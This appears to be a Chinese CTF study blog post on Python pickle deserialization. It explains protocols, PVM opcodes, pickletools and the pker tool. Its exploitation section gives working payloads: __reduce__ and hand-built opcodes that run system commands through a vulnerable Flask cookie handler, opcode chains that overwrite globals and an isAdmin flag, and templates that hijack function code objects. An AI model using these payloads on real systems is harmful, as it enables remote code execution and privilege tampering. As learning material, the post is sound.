---
title: "Pickle反序列化学习" # 文章标题
date: 2026-03-24T11:10:00+08:00 # 创作时间 (遵循 ISO 8601 格式)
lastmod: 2026-03-24T11:15:00+08:00 # 最后修改时间

# 分类与标签
categories: ["Web安全", "Python安全"] # 大分类，会生成对应的导航页面
tags: ["Python安全", "Pickle反序列化", "CTF"] # 细分标签，用于搜索过滤

toc: true # 开启目录
---
## 序列化/反序列化方法

pickle 模块中的4个序列/反序列化方法

+ `pickle.dump(obj, file)：将对象序列化后保存到文件`
+ `pickle.load(file)：将文件中的内容反序列化`
+ `pickle.dumps(obj)：将对象转化为序列化字节串`
+ `pickle.loads(bytes_obj)：字符串格式的字节流反序列化为对象`

> 注：file文件需要以 2 进制方式打开(wb/rb)

### 序列化(dumps)

```
import pickle
class A(object):
	name=''
	def __init__(self,name):
		self.name=name
		self.age=18

a=A('joe')
p_a=pickle.dumps(a)
print(a)
print('----------')
print(p_a)	
```

Python3运行的结果

![](images/1753878813788-a9ce6159-7cb1-42f3-b6c3-fdcad93971a3.png)
Python2 运行的结果

![](images/1753878934848-1b6c145e-51fc-4e3a-a541-1239a41f9995.png)

python2的结果中几乎完全由 ASCII 字符组成，肉眼可见类名和属性名，而python3的结果中包含大量不可打印的十六进制字节码

这种差异的本质是序列化时采用的协议(Protocol)不同

- **Python 2**：支持协议 0, 1, 2，默认使用协议 **0**（ASCII 文本模式，效率较低）
- **Python 3**：引入了协议 3, 4 (3.4+), 5 (3.8+)在 Python 3.8+ 中，默认是 **4**

除了协议不同，python2和python3对于字符串与字节的处理也会造成差异：Python 2 的 `str` 是字节流，而 Python 3 的 `str` 是 Unicode 字符串

下面是6种协议输出的对比

```
Protocol0:
b'ccopy_reg\n_reconstructor\np0\n(c__main__\nA\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVjoe\np7\nsVage\np8\nI18\nsb.'

Protocol1:
b'ccopy_reg\n_reconstructor\nq\x00(c__main__\nA\nq\x01c__builtin__\nobject\nq\x02Ntq\x03Rq\x04}q\x05(X\x04\x00\x00\x00nameq\x06X\x03\x00\x00\x00joeq\x07X\x03\x00\x00\x00ageq\x08K\x12ub.'

Protocol2: b'\x80\x02c__main__\nA\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00joeq\x04X\x03\x00\x00\x00ageq\x05K\x12ub.'

Protocol3:
b'\x80\x03c__main__\nA\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00joeq\x04X\x03\x00\x00\x00ageq\x05K\x12ub.'

Protocol4:
b'\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x01A\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x03joe\x94\x8c\x03age\x94K\x12ub.'

Protocol5:
b'\x80\x05\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x01A\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x03joe\x94\x8c\x03age\x94K\x12ub.'
```

### 反序列化(loads)

`__reduce__` 是 `pickle` 协议的一部分，当一个对象包含无法直接序列化的内容（如外部资源句柄、动态生成的函数）时，可以通过 `__reduce__` 告诉 Python 如何重新构造它
它通常返回一个元组，其中包含：

1. 一个**可调用对象**（通常是类本身或一个构造函数），用于重建对象
2. 一个**参数元组**，传递给上述可调用对象

### PVM

pickle 是一种栈语言，由一串 opcode（指令集）组成，该语言的解析是依靠 Pickle Virtual Machine(PVM)进行的，PVM涉及到三个部分：指令处理器 、栈(stack)和内存(memory 或者 memo)

- 指令处理器：从流中读取 opcode 和参数，并对其进行解释处理，重复这个动作，直到遇到 `.` 停止，最终**留在栈顶的值**将被作为反序列化对象返回。
- 栈：由Python的list实现，被用来临时存储数据、参数以及对象
- 内存：由Python的dict实现，将反序列化完成的数据以 `key-value` 的形式储存在其中，以便后来使用

### 常用的 opcode

> 通过对`opcode`的编写可以进行Python代码执行、覆盖变量等操作。直接编写的`opcode`灵活性比使用pickle序列化生成的代码更高，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）

| Opcode    | 作用                                                                  | 示例                    | 栈变化              |
| :-------- | :------------------------------------------------------------------ | :-------------------- | :--------------- |
| c         | 获取一个全局对象或import一个模块                                                 | c[module]\n[instance] | 获得的对象入栈          |
| o         | 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） | o                     | 相关数据出栈，返回值入栈     |
| i         | 相当于c和o的组合，先获取全局函数，再寻找MARK并将之间的数据组合为元组作为参数执行                         | i[module]\n[callable] | 相关数据出栈，返回值入栈     |
| N         | 实例化一个None                                                           | N                     | None入栈           |
| S         | 实例化一个字符串对象                                                          | S'xxx'                | 字符串入栈            |
| V         | 实例化一个UNICODE字符串对象                                                   | Vxxx                  | 字符串入栈            |
| I         | 实例化一个int对象                                                          | Ixxx                  | int入栈            |
| F         | 实例化一个float对象                                                        | Fx.x                  | float入栈          |
| I01 / I00 | 实例化一个bool对象                                                         | I01                   | bool入栈           |
| R         | 栈第一个对象为函数，第二个对象（元组）为参数，调用函数                                         | R                     | 函数和参数出栈，返回值入栈    |
| .         | 程序结束，栈顶元素作为返回值                                                      | .                     | 无                |
| (         | 压入一个MARK标记                                                          | (                     | MARK入栈           |
| t         | 找到最近MARK并组合为元组                                                      | t                     | MARK及数据出栈，元组入栈   |
| )         | 压入一个空元组                                                             | )                     | 空元组入栈            |
| l         | 找到最近MARK并组合为列表                                                      | l                     | MARK及数据出栈，列表入栈   |
| ]         | 压入一个空列表                                                             | ]                     | 空列表入栈            |
| d         | 找到最近MARK并组合为字典（key-value）                                           | d                     | MARK及数据出栈，字典入栈   |
| }         | 压入一个空字典                                                             | }                     | 空字典入栈            |
| p         | 将栈顶对象存入 memo_n                                                      | pn                    | 无                |
| g         | 将 memo_n 的对象压栈                                                      | gn                    | 对象入栈             |
| 0         | 丢弃栈顶对象                                                              | 0                     | 栈顶出栈             |
| b         | 用栈顶字典给对象设置属性                                                        | b                     | 字典出栈，对象更新        |
| s         | 将栈顶两个元素作为 key-value 更新第三个对象（dict/list）                              | s                     | key、value出栈，容器更新 |
| u         | 将MARK后的 key-value 批量更新到前一个字典                                        | u                     | MARK及数据出栈，字典更新   |
| a         | 将栈顶元素 append 到下一个列表                                                 | a                     | 元素出栈，列表更新        |
| e         | 将MARK后的数据 extend 到前一个列表                                             | e                     | MARK及数据出栈，列表更新   |

### 工具使用

#### pickletools 的使用

```python
import pickletools

opcode = '''cos
system
(S'cat /f*>test.txt'
tR.'''.encode()

pickletools.dis(opcode)

# 输出:
#     0: c    GLOBAL     'os system'
#    11: (    MARK
#    12: S        STRING     'cat /f*>test.txt'
#    32: t        TUPLE      (MARK at 11)
#    33: R    REDUCE
#    34: .    STOP
# highest protocol among opcodes = 0
```

`pickletools.dis`方法可以把一段 opcode 转换成更易读的方式

#### pker 的使用

github: https://github.com/EddieIvan01/pker
有三个比较常用的语法:

GLOBAL：获取 module 下的**全局对象**，包括类、对象、函数、模块全局变量, 输入参数: `module,instance`

```plain
f = GLOBAL("os", "system")

opcode:
b'cos\nsystem\np0\n0'
```

INST：建立并入栈一个对象 , 可执行一个函数

```plain
INST('os','system','whoami')
return

opcode:
b"(S'whoami'\nios\nsystem\n."
```

OBJ：建立并入栈一个对象  , 可执行一个函数

```plain
OBJ(GLOBAL('os','system'),'whoami')
return

opcode:
b"(cos\nsystem\nS'whoami'\no."
```

其他语法:

```plain
xxx(xx1,xx2...)
使用参数xx1,xx2,..调用函数xxx（先将函数入栈，再将参数入栈并调用）

li[0]=321
或
globals_dic['local_var']='hello'
更新列表或字典的某项的值

xx.attr=123
对xx对象进行属性设置

return
return xxx
```

注意：

1. 由于执行opcode无法通过``索引``，``key``，以及``属性名``来获取``list``，``dict``，``obj``中对应的``值``与``属性``，也就是无法类似执行下面这样的Python代码

```
list=[1,2,3,4]
a=list[0]
```

也就是``list[0]``不能作为``=``的右值，但是它可以作为左值，即可以给``list[0]``赋值，但是不能直接用它给另外一个变量赋值

解决方法：

- 对于``obj``，从``builtins``中获取``getattr``方法，然后利用它获取属性值
- 先从``builtins``中获取``getattr``方法，然后利用``getattr``获取``list``和``dict``的``__getitem__``方法或者其他方法来获取值
  详细用法可以看下面的利用示例

2. opcode中表示字符串对象的``S``一般都是用单引号包裹

### 利用

#### 函数执行

```python
import pickle
import base64
from flask import Flask, render_template_string, request, render_template

app = Flask(__name__)
@app.route("/flask",methods=["GET","POST"])
def index():
    try:
        user = base64.b64decode(request.cookies.get("user"))
        un_user=pickle.loads(user)
        username=un_user["username"]
    except:
        username="visitor"
    return "hello %s" %username

if __name__ == "__main__":
    app.run(host="0.0.0.0",port=5000,debug=True)
```

以上是一个flask的web应用，从cookie中接收一个user参数base64解码后进行反序列化，然后提取username

利用``__reduce__``来生成payload，返回值中的回调函数设置为危险的函数即可

```python
import pickle
import os
import base64
class A(object):
    def __reduce__(self):
        return (os.system,('whoami',))

a=A()
p_a=base64.b64encode(pickle.dumps(a))
print(p_a)

#输出：b'gASVHgAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4='
```

当把这串base64编码传入时，成功执行了``whoami``

<!-- 这是一张图片，ocr 内容为： -->

![](images/1753882225279-bab45fbf-0c42-427f-81cf-a152a42ad528.png)

这种生成payload的方式固然简便，但是由于``pickle``序列化时不同的``protocol``生成的字节串中有一些固定的字节，很容易被黑名单拦截，所以很多时候需要构造``opcode ``

```plain
pker:

INST('os','system','whoami')
return

OBJ(GLOBAL('os','system'),'dir')
return
```

```python
opcode1=b"(S'whoami'\nios\nsystem\n."
opcode2=b"(cos\nsystem\nS'dir'\no."

pickle.loads(opcode)
```

<!-- 这是一张图片，ocr 内容为： -->

![](images/1765290834258-e6259d20-e7ae-400b-b5af-2a625f6c2516.png)

#### 全局变量覆盖与类属性污染

```python
import pickle

class User:
    isAdmin=False

    username=""

    def __init__(self,name):

        self.username=name

    def __repr__(self):

        return f"username:{self.username} isAdmin:{self.isAdmin==True}"

  

u=User("testuser")

SecretKey="1111122222"

opcode="cbuiltins\ngetattr\np0\n0c__main__\nu\np1\n0g1\n(}(S'username'\nS'admin'\ndtbg1\n(}(S'isAdmin'\nS'True'\ndtbg0\n(g1\nS'__class__'\ntRp4\n0g0\n(g1\nS'__init__'\ntRp5\n0g0\n(g5\nS'__globals__'\ntRp6\n0g6\nS'SecretKey'\nS'pollute'\ns.".replace("S'True'","I01").encode()

pickle.loads(opcode)

print(u)

print(SecretKey)

#输出结果
#username:admin isAdmin:True
#pollute
```

```plain
pker：

getattr=GLOBAL('builtins','getattr')
u=GLOBAL('__main__','u')
u.username='admin'
u.isAdmin='True'
uclass=getattr(u,'__class__')
init=getattr(u,'__init__')
globals=getattr(init,'__globals__')
globals['SecretKey']='pollute'
return

输出结果：
b"cbuiltins\ngetattr\np0\n0c__main__\nu\np1\n0g1\n(}(S'username'\nS'admin'\ndtbg1\n(}(S'isAdmin'\nS'True'\ndtbg0\n(g1\nS'__class__'\ntRp4\n0g0\n(g1\nS'__init__'\ntRp5\n0g0\n(g5\nS'__globals__'\ntRp6\n0g6\nS'SecretKey'\nS'pollute'\ns."
```

这里由于pker工具的缺陷，不能设置布尔值，因此先将``u.isAdmin``设置为``'True'``，后续将``S'True'``替换为``I01``

还要注意一点：如果要污染类似于``SecretKey``这样的全局变量，必须通过污染``globals``来达到，不能直接从``__main__``中获取``SecretKey``然后修改


#### 函数劫持

下面先来看 python 中实现函数劫持的两种方法，然后用opcode实现:

方法一: 用 `exec` 在提供的命名空间中生成新的函数对象,然后将原函数对象覆盖

```python
python:

def add(x,y):
    return x+y
src = "def new_add(x, y): return 3*x + y"
ns = {}
exec(src, ns)
new_add = ns["new_add"]

setattr(__import__('__main__'), "add", new_add)

print(add(2,5))
```

```plain
pker:

exec=GLOBAL('builtins','exec')
setattr=GLOBAL('builtins','setattr')
dict=GLOBAL("builtins","dict")
getattr=GLOBAL("builtins","getattr")
__import__=GLOBAL("builtins","__import__")
get=getattr(dict,"get")
ns={}
code="def new_add(x, y): return 3*x + y"
exec(code,ns)
new_add=get(ns,'new_add')
setattr(__import__('__main__'), "add", new_add)
return 

opcode:
b"cbuiltins\nexec\np0\n0cbuiltins\nsetattr\np1\n0cbuiltins\ndict\np2\n0cbuiltins\ngetattr\np3\n0cbuiltins\n__import__\np4\n0g3\n(g2\nS'get'\ntRp5\n0(dp6\n0S'def new_add(x, y): return 3*x + y'\np7\n0g0\n(g7\ng6\ntRg5\n(g6\nS'new_add'\ntRp8\n0g1\n(g4\n(S'__main__'\ntRS'add'\ng8\ntR."
```


![](images/1765356194696-2b37a538-5ffa-45f0-89af-46bccaeedd21.png)

方法二：构建新的 code 对象并将覆盖原函数的 code 对象

在``CPython``(Python 官方解释器) 里，当执行函数 `func()`时，解释器会拿 `func.__code__ `创建 ``frame``，按里面的 `co_code` **字节码**解释执行，因此我们可以修改`co_code` **字节码**以及其他的一些相关参数来达到``Function Hijack``的目的，code对象中除了co_code字节码

下面以Python 3.11版本为例

| 属性                 | 说明                        |
| :----------------- | :------------------------ |
| co_argcount        | 参数数量（不包括仅关键字参数、* 或 ** 参数） |
| co_code            | 字符串形式的原始字节码               |
| co_cellvars        | 单元变量名称的元组（通过包含作用域引用）      |
| co_consts          | 字节码中使用的常量元组               |
| co_filename        | 创建此代码对象的文件名称              |
| co_firstlineno     | 在Python源代码中的起始行号          |
| co_flags           | CO_* 标志的位图                |
| co_lnotab          | 行号到字节码索引的编码映射             |
| co_freevars        | 自由变量名称的元组（通过闭包引用）         |
| co_posonlyargcount | 仅限位置参数数量                  |
| co_kwonlyargcount  | 仅限关键字参数数量（不包括 ** 参数）      |
| co_name            | 代码对象名称                    |
| co_qualname        | 完整限定名称                    |
| co_names           | 除参数和局部变量外的名称元组            |
| co_nlocals         | 局部变量数量                    |
| co_stacksize       | 虚拟机所需栈空间大小                |
| co_varnames        | 参数名和局部变量组成的元组             |

> 不同版本的code对象差异参考官方文档：[[https://docs.python.org/zh-cn/3.14/library/inspect.html]]

```
def myfunc(a, b=3, *args, **kwargs):
    c = a + b

    mm = 111

    str_mm = "test test"

    print(a + b + mm)

    return c

  

co_list=[i for i in dir(myfunc.__code__) if  i.startswith('co')]

print(len(co_list))

  
for attr in co_list:

        print(f"{attr}:\t{getattr(myfunc.__code__, attr)}")
```

输出：
```
21
co_argcount:    2
co_cellvars:    ()
co_code:        b'\x97\x00|\x00|\x01z\x00\x00\x00}\x04d\x01}\x05d\x02}\x06t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00|\x01z\x00\x00\x00|\x05z\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00|\x04S\x00'
co_consts:      (None, 111, 'test test')
co_exceptiontable:      b''
co_filename:    d:\Pydemos\amodule.py
co_firstlineno: 1
co_flags:       15
co_freevars:    ()
co_kwonlyargcount:      0
co_lines:       <built-in method co_lines of code object at 0x000002D598CC1730>
co_linetable:   b'\x80\x00\xd8\x08\t\x88A\x89\x05\x80A\xd8\t\x0c\x80B\xd8\r\x18\x80F\xdd\x04\t\x88!\x88a\x89%\x90"\x89*\xd1\x04\x15\xd4\x04\x15\xd0\x04\x15\xd8\x0b\x0c\x80H'
co_lnotab:      b'\x02\x01\n\x01\x04\x01\x04\x01*\x01'
co_name:        myfunc
co_names:       ('print',)
co_nlocals:     7
co_positions:   <built-in method co_positions of code object at 0x000002D598CC1730>
co_posonlyargcount:     0
co_qualname:    myfunc
co_stacksize:   4
co_varnames:    ('a', 'b', 'args', 'kwargs', 'c', 'mm', 'str_mm')
```

```
bmodule.py:
#让它与被劫持函数尽量相似(行号，行数)，需要替换的属性减少,
def myfunc(a, b=3, *args, **kwargs):

    c = a + b

    mm = 111

    str_mm = "test test"
    
    print(a + b + mm)

    return __import__('os').system('whoami')

  

co_list=[i for i in dir(myfunc.__code__) if  i.startswith('co')]

print(len(co_list))

  

b_co_dict={}

  

for attr in co_list:

        #print(f"{attr}:\t{getattr(myfunc.__code__, attr)}")

        b_co_dict[f'{attr}']=getattr(myfunc.__code__,attr)

        
        

amodule.py:
def myfunc(a, b=3, *args, **kwargs):
    c = a + b
    mm = 111
    str_mm = "test test"
    print(a + b + mm)
    return c

  

co_list=[i for i in dir(myfunc.__code__) if  i.startswith('co')]


a_co_dict={}

for attr in co_list:
        a_co_dict[f'{attr}']=getattr(myfunc.__code__,attr)

from bmodule import b_co_dict

count=0

#遍历查找两个code对象的不同之处
for k,v1 in a_co_dict.items():
      v2=b_co_dict[k]
      if v2!=v1:
            print("="*30)
            print(f'{k}:\n{v1}\n\n{v2}')
            print("="*30,"\n")
            count+=1

print(count)
```

```
输出结果：
==============================
co_code:
b'\x97\x00|\x00|\x01z\x00\x00\x00}\x04d\x01}\x05d\x02}\x06t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00|\x01z\x00\x00\x00|\x05z\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00|\x04S\x00'

b'\x97\x00|\x00|\x01z\x00\x00\x00}\x04d\x01}\x05d\x02}\x06t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00'
==============================

==============================
co_consts:
(None, 111, 'test test')

(None, 111, 'test test', 'os', 'whoami')
==============================

==============================
co_filename:
d:\Pydemos\amodule.py

d:\Pydemos\bmodule.py
==============================

==============================
co_lines:
<built-in method co_lines of code object at 0x000001DB46A81730>

<built-in method co_lines of code object at 0x000001DB46AC5680>
==============================

==============================
co_linetable:
b'\x80\x00\xd8\x08\t\x88A\x89\x05\x80A\xd8\t\x0c\x80B\xd8\r\x18\x80F\xdd\x04\t\x88!\x88a\x89%\x90"\x89*\xd1\x04\x15\xd4\x04\x15\xd0\x04\x15\xd8\x0b\x0c\x80H'

b'\x80\x00\xd8\x08\t\x88A\x89\x05\x80A\xd8\t\x0c\x80B\xd8\r\x18\x80F\xdd\x0b\x15\x90d\xd1\x0b\x1b\xd4\x0b\x1b\xd7\x0b"\xd2\x0b"\xa08\xd1\x0b,\xd4\x0b,\xd0\x04,'
==============================

==============================
co_lnotab:
b'\x02\x01\n\x01\x04\x01\x04\x01*\x01'

b'\x02\x01\n\x01\x04\x01\x04\x01'
==============================

==============================
co_names:
('print',)

('__import__', 'system', 'print')
==============================

==============================
co_positions:
<built-in method co_positions of code object at 0x000001DB46A81730>

<built-in method co_positions of code object at 0x000001DB46AC5680>
==============================

==============================
co_stacksize:
4

3
==============================

9
```

其中需要替换且可以替换的参数有：
```

co_code

co_consts

co_linetable

co_lnotab(在使用types.CodeType构造code对象时不用传入)

co_names

co_nlocals

co_stacksize

```



```python
bmodule.py:
def myfunc(a, b=3, *args, **kwargs):  
    c = a + b  
    mm = 111  
    str_mm = "test test"
    print(a + b + mm)   
    return __import__('os').system('whoami')


amodule.py:

def myfunc(a, b=3, *args, **kwargs):  
    c = a + b  
    mm = 111  
    str_mm = "test test"  
    print(a + b + mm)  
    return c  
  
from bmodule import myfunc as myfuncb  
import types  
  
old_code=myfunc.__code__  
hijack_code=myfuncb.__code__  
  
new_code = types.CodeType(  
    old_code.co_argcount,            
    old_code.co_posonlyargcount,      
    old_code.co_kwonlyargcount,       
    hijack_code.co_nlocals,         
    hijack_code.co_stacksize,      
    old_code.co_flags,              
    hijack_code.co_code,             
    hijack_code.co_consts,           
    hijack_code.co_names,            
    old_code.co_varnames,             
    old_code.co_filename,             
    old_code.co_name,                 
    old_code.co_qualname,           
    old_code.co_firstlineno,          
    hijack_code.co_linetable,       
    old_code.co_exceptiontable,   
    old_code.co_freevars,       
    old_code.co_cellvars         
)  
  
myfunc.__code__=new_code  
  
print(myfunc(1))

#输出：
#21
#115
#laptop-du6ejogd\sbr20
#0
```

成功劫持，下面用pker构造opcode来劫持，
```
def myfunc(a, b=3, *args, **kwargs):  
    c = a + b  
    mm = 111  
    str_mm = "test test"  
    print(a + b + mm)  
    return __import__('os').system('whoami')  
  
hijack_code=myfunc.__code__  
  
print("co_nlocals=",hijack_code.co_nlocals,"\n")  
print("co_stacksize=",hijack_code.co_stacksize,"\n")  
print("co_code=",list(hijack_code.co_code),"\n")  
print("co_consts=",hijack_code.co_consts,"\n")  
print("co_names=",hijack_code.co_names,"\n")  
print("co_linetable=",list(hijack_code.co_linetable),"\n")


#输出结果：
#co_nlocals= 7 
#
#co_stacksize= 4 
#
#co_code= [151, 0, 124, 0, 124, 1, 122, 0, 0, 0, 125, 4, 100, 1, 125, 5, 100, 2, #125, 6, 116, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 124, 0, 124, 1, 122, 0, 0, 0, 124, #5, 122, 0, 0, 0, 166, 1, 0, 0, 171, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 116, 3, 0, #0, 0, 0, 0, 0, 0, 0, 0, 0, 100, 3, 166, 1, 0, 0, 171, 1, 0, 0, 0, 0, 0, 0, 0, 0, #160, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 100, 4, 166, #1, 0, 0, 171, 1, 0, 0, 0, 0, 0, 0, 0, 0, 83, 0] 
#
#co_consts= (None, 111, 'test test', 'os', 'whoami') 
#
#co_names= ('print', '__import__', 'system') 
#
#co_linetable= [128, 0, 216, 8, 9, 136, 65, 137, 5, 128, 65, 216, 9, 12, 128, 66, #216, 13, 24, 128, 70, 221, 4, 9, 136, 33, 136, 97, 137, 37, 144, 34, 137, 42, #209, 4, 21, 212, 4, 21, 208, 4, 21, 221, 11, 21, 144, 100, 209, 11, 27, 212, 11, #27, 215, 11, 34, 210, 11, 34, 160, 56, 209, 11, 44, 212, 11, 44, 208, 4, 44]
```
这里需要把``co_code``和``co_linetable``这两个字节串转换为整数list的形式，如果直接用``latin-1``编码，反序列化时会引发报错


```plain
pker：

getattr=GLOBAL('builtins','getattr')
setattr=GLOBAL('builtins','setattr')
CodeType=GLOBAL('types','CodeType')
myfunc=GLOBAL('__main__','myfunc')
old_code=getattr(myfunc,'__code__')

co_nlocals=7
co_stacksize=4
co_code=OBJ(GLOBAL('builtins','bytes'),[151, 0, 124, 0, 124, 1, 122, 0, 0, 0, 125, 4, 100, 1, 125, 5, 100, 2, 125, 6, 116, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 124, 0, 124, 1, 122, 0, 0, 0, 124, 5, 122, 0, 0, 0, 166, 1, 0, 0, 171, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 116, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 100, 3, 166, 1, 0, 0, 171, 1, 0, 0, 0, 0, 0, 0, 0, 0, 160, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 100, 4, 166, 1, 0, 0, 171, 1, 0, 0, 0, 0, 0, 0, 0, 0, 83, 0])
co_consts= (None, 111, 'test test', 'os', 'whoami')
co_names= ('print', '__import__', 'system')
co_linetable=OBJ(GLOBAL('builtins','bytes'),[128, 0, 216, 8, 9, 136, 65, 137, 5, 128, 65, 216, 9, 12, 128, 66, 216, 13, 24, 128, 70, 221, 4, 9, 136, 33, 136, 97, 137, 37, 144, 34, 137, 42, 209, 4, 21, 212, 4, 21, 208, 4, 21, 221, 11, 21, 144, 100, 209, 11, 27, 212, 11, 27, 215, 11, 34, 210, 11, 34, 160, 56, 209, 11, 44, 212, 11, 44, 208, 4, 44])

co_argcount = getattr(old_code, 'co_argcount')
co_posonlyargcount = getattr(old_code, 'co_posonlyargcount')
co_kwonlyargcount = getattr(old_code, 'co_kwonlyargcount')
co_flags = getattr(old_code, 'co_flags')
co_varnames = getattr(old_code, 'co_varnames')
co_filename = getattr(old_code, 'co_filename')
co_name = getattr(old_code, 'co_name')
co_firstlineno = getattr(old_code, 'co_firstlineno')
co_qualname = getattr(old_code, 'co_qualname')
co_exceptiontable = getattr(old_code, 'co_exceptiontable')
co_freevars = getattr(old_code, 'co_freevars')
co_cellvars = getattr(old_code, 'co_cellvars')

new_code =CodeType(co_argcount, co_posonlyargcount, co_kwonlyargcount, co_nlocals, co_stacksize, co_flags, co_code, co_consts, co_names, co_varnames, co_filename, co_name, co_qualname, co_firstlineno, co_linetable, co_exceptiontable, co_freevars, co_cellvars)

setattr(myfunc, "__code__", new_code)
return

```


注意: Python 3.11以上的版本都可以用Python 3.11的pker模板，不过``co_code``和``co_linetable``
需要在对应的版本下生成

Python3.10模板(少了**`co_qualname`** 和 **`co_exceptiontable`**)
```
getattr=GLOBAL('builtins','getattr')
setattr=GLOBAL('builtins','setattr')
CodeType=GLOBAL('types','CodeType')
myfunc=GLOBAL('__main__','myfunc')
old_code=getattr(myfunc,'__code__')

co_nlocals=7
co_stacksize=3
co_code=OBJ(GLOBAL('builtins','bytes'),[124, 0, 124, 1, 23, 0, 125, 4, 100, 1, 125, 5, 100, 2, 125, 6, 116, 0, 124, 0, 124, 1, 23, 0, 124, 5, 23, 0, 131, 1, 1, 0, 116, 1, 100, 3, 131, 1, 160, 2, 100, 4, 161, 1, 83, 0])
co_consts= (None, 111, 'test test', 'os', 'whoami')
co_names= ('print', '__import__', 'system')
co_linetable=OBJ(GLOBAL('builtins','bytes'),[8, 1, 4, 1, 4, 1, 16, 1, 14, 1])

co_argcount = getattr(old_code, 'co_argcount')
co_posonlyargcount = getattr(old_code, 'co_posonlyargcount')
co_kwonlyargcount = getattr(old_code, 'co_kwonlyargcount')
co_flags = getattr(old_code, 'co_flags')
co_varnames = getattr(old_code, 'co_varnames')
co_filename = getattr(old_code, 'co_filename')
co_name = getattr(old_code, 'co_name')
co_firstlineno = getattr(old_code, 'co_firstlineno')
co_freevars = getattr(old_code, 'co_freevars')
co_cellvars = getattr(old_code, 'co_cellvars')

new_code =CodeType(co_argcount, co_posonlyargcount, co_kwonlyargcount, co_nlocals, co_stacksize, co_flags, co_code, co_consts, co_names, co_varnames, co_filename, co_name, co_firstlineno, co_linetable, co_freevars, co_cellvars)

setattr(myfunc, "__code__", new_code)
return
```



Python3.9模板(用``co_lnotab``代替``co_linetable``)
```
getattr=GLOBAL('builtins','getattr')
setattr=GLOBAL('builtins','setattr')
CodeType=GLOBAL('types','CodeType')
myfunc=GLOBAL('__main__','myfunc')
old_code=getattr(myfunc,'__code__')

co_nlocals=7
co_stacksize=3
co_code=OBJ(GLOBAL('builtins','bytes'),[124, 0, 124, 1, 23, 0, 125, 4, 100, 1, 125, 5, 100, 2, 125, 6, 116, 0, 124, 0, 124, 1, 23, 0, 124, 5, 23, 0, 131, 1, 1, 0, 116, 1, 100, 3, 131, 1, 160, 2, 100, 4, 161, 1, 83, 0])
co_consts= (None, 111, 'test test', 'os', 'whoami')
co_names= ('print', '__import__', 'system')
co_lnotab=OBJ(GLOBAL('builtins','bytes'),[0, 1, 8, 1, 4, 1, 4, 1, 16, 1])

co_argcount = getattr(old_code, 'co_argcount')
co_posonlyargcount = getattr(old_code, 'co_posonlyargcount')
co_kwonlyargcount = getattr(old_code, 'co_kwonlyargcount')
co_flags = getattr(old_code, 'co_flags')
co_varnames = getattr(old_code, 'co_varnames')
co_filename = getattr(old_code, 'co_filename')
co_name = getattr(old_code, 'co_name')
co_firstlineno = getattr(old_code, 'co_firstlineno')
co_freevars = getattr(old_code, 'co_freevars')
co_cellvars = getattr(old_code, 'co_cellvars')

new_code =CodeType(co_argcount, co_posonlyargcount, co_kwonlyargcount, co_nlocals, co_stacksize, co_flags, co_code, co_consts, co_names, co_varnames, co_filename, co_name, co_firstlineno, co_lnotab, co_freevars, co_cellvars)

setattr(myfunc, "__code__", new_code)
return
```